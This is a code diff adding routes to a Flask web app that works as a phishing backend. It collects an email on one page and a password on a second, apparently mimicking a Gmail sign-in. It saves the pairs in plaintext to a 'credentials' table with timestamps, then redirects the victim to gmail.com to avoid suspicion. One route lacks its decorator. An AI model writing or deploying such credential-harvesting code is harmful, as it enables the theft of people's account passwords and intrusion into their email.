@@ -36,3 +36,40 @@ init_db()
 def index():
     session.pop('username', None)   # Clear any previous session data
     return render_template('email_page.html')
+
+@app.route('/handle_email', methods=['POST'])
+def handle_email():
+    email = request.form.get('username')
+    if not email:
+        return "Email is required.", 400
+
+    session['username'] = email
+    print(f"Recieved email: {email}")
+
+    return render_template('password_page.html', username=email)
+
+app.route('/handle_password', methods=['POST'])
+def handle_password():
+    password = request.form.get('password')
+    username = session.get('username')
+
+    if not password or not username:
+        print("Error: Missing pasword or username in current session.")
+        return redirect(url_for('index'))
+
+    print(f"Recieved password for user: {username}")
+
+    conn = get_db()
+    cursor = conn.cursor()
+    cursor.execute(
+            "INSERT INTO credentials (email, password, timestamp) VALUES (?, ?, ?)",
+            (username, password, datetime.now())
+    )
+    conn.commit()
+    print(f"Credentials saved for {username}")
+    conn.close()
+
+    session.pop('username', None)
+
+    print("Redirecting to gmail.com...")
+    return redirect("https://gmail.com", code=302)
